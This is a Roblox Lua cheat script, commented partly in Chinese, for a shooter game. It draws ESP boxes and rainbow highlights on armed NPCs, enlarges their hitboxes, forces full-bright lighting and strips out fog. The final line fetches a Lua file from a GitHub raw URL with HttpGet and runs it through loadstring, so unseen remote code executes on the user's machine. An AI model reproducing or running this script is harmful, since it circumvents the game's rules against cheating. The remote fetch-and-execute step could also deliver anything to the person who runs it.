-- 🔧 SERVICES
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

-- ⚙️ SETTINGS
local showHitbox = true  -- 默认启用Hitbox
local fullBrightEnabled = true
local noFogEnabled = true

-- 🔁 VARIABLES
local cachedNPCs = {}
local originalSizes = {}  -- 存储原始Hitbox大小
local originalFogEnd = Lighting.FogEnd
local originalAtmospheres = {}
local createdESP = {}
local brightLoop = nil
local rainbowHighlights = {}  -- 存储所有高亮对象
local rainbowESP = {}         -- 存储所有ESP对象

-- 性能优化变量
local lastRainbowUpdate = 0
local rainbowUpdateInterval = 0.2  -- 降低彩虹效果更新频率
local lastCacheUpdate = 0
local cacheUpdateInterval = 3  -- 降低NPC缓存更新频率

-- 🎯 ALLOWED NPC WEAPONS
local allowedWeapons = {
    ["AI_AK"] = true, ["igla"] = true, ["AI_RPD"] = true, ["AI_PKM"] = true,
    ["AI_SVD"] = true, ["rpg7v2"] = true, ["AI_PP19"] = true, ["AI_RPK"] = true,
    ["AI_SAIGA"] = true, ["AI_MAKAROV"] = true, ["AI_PPSH"] = true, ["AI_DB"] = true,
    ["AI_MOSIN"] = true, ["AI_VZ"] = true, ["AI_6B47_Rifleman"] = true,
    ["AI_6B45_Commander"] = true, ["AI_6B47_Commander"] = true, ["AI_6B45_Rifleman"] = true,
    ["AI_KSVK"] = true, ["AI_Chicom"] = true, ["AI_6B26"] = true, ["AI_6B3M"] = true, 
    ["Machete"] = true, ["AI_Beanie"] = true, ["AI_FaceCover"] = true
}

-- 🛠️ HELPER FUNCTIONS (优化)
local function hasAllowedWeapon(npc)
    -- 优化：使用FindFirstChild替代遍历所有子项
    for weaponName in pairs(allowedWeapons) do
        if npc:FindFirstChild(weaponName) then 
            return true 
        end
    end
    return false
end

local function isAlive(npc)
    -- 优化：使用GetAttribute缓存状态
    if npc:GetAttribute("IsAlive") ~= nil then
        return npc:GetAttribute("IsAlive")
    end
    
    local alive = true
    for _, d in ipairs(npc:GetDescendants()) do
        if d:IsA("BallSocketConstraint") then 
            alive = false
            break
        end
    end
    npc:SetAttribute("IsAlive", alive)
    return alive
end

-- 🔲 ESP (优化)
local function createNpcHeadESP(npc)
    if createdESP[npc] then return end
    
    local head = npc:FindFirstChild("Head")
    if head and not head:FindFirstChild("HeadESP") then
        local esp = Instance.new("BoxHandleAdornment")
        esp.Name = "HeadESP"
        esp.Adornee = head
        esp.AlwaysOnTop = true
        esp.ZIndex = 5
        esp.Size = head.Size
        esp.Transparency = 0.3
        esp.Color3 = Color3.fromRGB(220, 20, 60)  -- 初始颜色（会被彩虹效果覆盖）
        esp.Parent = head
        createdESP[npc] = true
        
        -- 添加到彩虹ESP列表
        rainbowESP[esp] = true

        -- 使用属性监听替代循环检查
        npc:GetPropertyChangedSignal("Parent"):Connect(function()
            if not npc.Parent then
                if esp and esp.Parent then 
                    rainbowESP[esp] = nil
                    esp:Destroy()
                end
                createdESP[npc] = nil
            end
        end)
    end
end

-- 🔥 VISUAL EFFECTS (修复)
local function LoopFullBright()
    if brightLoop then return end  -- 防止重复创建
    
    -- 创建一次性的效果设置
    Lighting.Brightness = 1
    Lighting.GlobalShadows = false
    Lighting.ShadowSoftness = 0     -- 禁用阴影柔化
    Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
    Lighting.Ambient = Color3.fromRGB(200, 200, 200)
    
    -- 修复：使用RenderStepped确保效果持续
    brightLoop = RunService.RenderStepped:Connect(function()
        Lighting.Brightness = 1
        Lighting.GlobalShadows = false
        Lighting.ShadowSoftness = 0
        Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
        Lighting.Ambient = Color3.fromRGB(200, 200, 200)
    end)
end

local function StopFullBright()
    if brightLoop then 
        brightLoop:Disconnect() 
        brightLoop = nil 
    end
    Lighting.Brightness = 1
    Lighting.GlobalShadows = true
    Lighting.ShadowSoftness = 0.5  -- 恢复默认值
end

local function applyNoFog()
    originalFogEnd = Lighting.FogEnd  -- 确保保存原始值
    Lighting.FogEnd = 100000
    
    -- 修复：保存所有原始大气效果
    originalAtmospheres = {}
    for _, v in pairs(Lighting:GetChildren()) do
        if v:IsA("Atmosphere") then
            table.insert(originalAtmospheres, v:Clone())
            v:Destroy()
        end
    end
    
    -- 修复：使用循环确保雾效果持续
    task.spawn(function()
        while noFogEnabled do
            Lighting.FogEnd = 100000
            task.wait(0.5)
        end
    end)
end

local function disableNoFog()
    noFogEnabled = false
    Lighting.FogEnd = originalFogEnd
    for _, v in pairs(originalAtmospheres) do
        if v then
            local newAtmo = v:Clone()
            newAtmo.Parent = Lighting
        end
    end
    originalAtmospheres = {}
end

-- 🎯 HITBOX SETUP (添加批量处理优化)
local function updateAllHitboxes()
    for npc, originalSize in pairs(originalSizes) do
        if npc.Parent then
            local root = npc:FindFirstChild("Root")
            if root then
                root.Size = showHitbox and Vector3.new(20, 20, 20) or originalSize
                root.Transparency = showHitbox and 0.85 or 0
                root.Material = showHitbox and Enum.Material.Neon or Enum.Material.Plastic
            end
        end
    end
end

local function setupNPC(npc)
    if npc:IsA("Model") and npc.Name == "Male" and npc:FindFirstChild("UpperTorso") then
        local root = npc:FindFirstChild("Root")
        if root and showHitbox then
            if not originalSizes[npc] then
                originalSizes[npc] = root.Size
            end
            root.Size = Vector3.new(20, 20, 20)
            root.Transparency = 0.85
            root.Material = Enum.Material.Neon
            root.Color = Color3.fromRGB(255, 0, 0)
        elseif root and originalSizes[npc] then
            root.Size = originalSizes[npc]
        end
    end
end

-- 🔍 NPC HIGHLIGHT (优化)
local function highlightMaleModels()
    -- 使用基于集合的方法避免重复高亮
    local currentModels = {}
    for _, object in pairs(workspace:GetChildren()) do
        if object:IsA("Model") and object.Name == "Male" then
            currentModels[object] = true
            if not rainbowHighlights[object] then
                local highlight = Instance.new("Highlight")
                highlight.Adornee = object
                highlight.Parent = object
                highlight.FillTransparency = 0.9
                highlight.OutlineTransparency = 0
                rainbowHighlights[object] = highlight
                
                -- 设置对象移除时清理
                object.AncestryChanged:Connect(function()
                    if not object.Parent then
                        if rainbowHighlights[object] then
                            rainbowHighlights[object]:Destroy()
                            rainbowHighlights[object] = nil
                        end
                    end
                end)
            end
        end
    end
    
    -- 清理已消失的NPC
    for npc, highlight in pairs(rainbowHighlights) do
        if not currentModels[npc] then
            if highlight then
                highlight:Destroy()
            end
            rainbowHighlights[npc] = nil
        end
    end
end

-- 🌈 优化的彩虹效果
task.spawn(function()
    while true do
        local now = tick()
        if now - lastRainbowUpdate >= rainbowUpdateInterval then
            lastRainbowUpdate = now
            local hue = now % 5 / 5
            local color = Color3.fromHSV(hue, 1, 1)
            
            -- 批量更新高亮
            for npc, highlight in pairs(rainbowHighlights) do
                if highlight and highlight.Parent then
                    highlight.FillColor = color
                    highlight.OutlineColor = color
                else
                    rainbowHighlights[npc] = nil
                end
            end
            
            -- 批量更新ESP
            for esp in pairs(rainbowESP) do
                if esp and esp.Parent then
                    esp.Color3 = color
                else
                    rainbowESP[esp] = nil
                end
            end
        end
        task.wait()
    end
end)

-- 🔄 优化的主缓存循环
task.spawn(function()
    while true do
        local now = tick()
        if now - lastCacheUpdate >= cacheUpdateInterval then
            lastCacheUpdate = now
            
            -- 更新NPC缓存
            cachedNPCs = {}
            for _, npc in ipairs(workspace:GetChildren()) do
                if npc:IsA("Model") and npc.Name == "Male" then
                    if hasAllowedWeapon(npc) and isAlive(npc) then
                        table.insert(cachedNPCs, npc)
                        createNpcHeadESP(npc)
                        setupNPC(npc)  -- 设置Hitbox
                    end
                end
            end
            
            -- 更新高亮
            highlightMaleModels()
        end
        task.wait(0.5)
    end
end)

-- 🧩 优化的NPC添加处理
workspace.ChildAdded:Connect(function(npc)
    if npc:IsA("Model") and npc.Name == "Male" then
        -- 延迟检查确保组件加载完成
        task.wait(0.5)
        if hasAllowedWeapon(npc) and isAlive(npc) then
            setupNPC(npc)
            createNpcHeadESP(npc)
            highlightMaleModels()
        end
    end
end)

-- 🧹 NPC移除清理
workspace.ChildRemoved:Connect(function(npc)
    if npc:IsA("Model") and npc.Name == "Male" then
        -- 清理高亮
        if rainbowHighlights[npc] then
            rainbowHighlights[npc]:Destroy()
            rainbowHighlights[npc] = nil
        end
        
        -- 清理原始尺寸记录
        originalSizes[npc] = nil
        
        -- 清理ESP
        if createdESP[npc] then
            createdESP[npc] = nil
        end
    end
end)

-- 🚀 INITIAL SETUP (修复)
applyNoFog()
LoopFullBright()

loadstring(game:HttpGet("https://raw.githubusercontent.com/VB485/RB/refs/heads/main/FPS3.lua", true))() 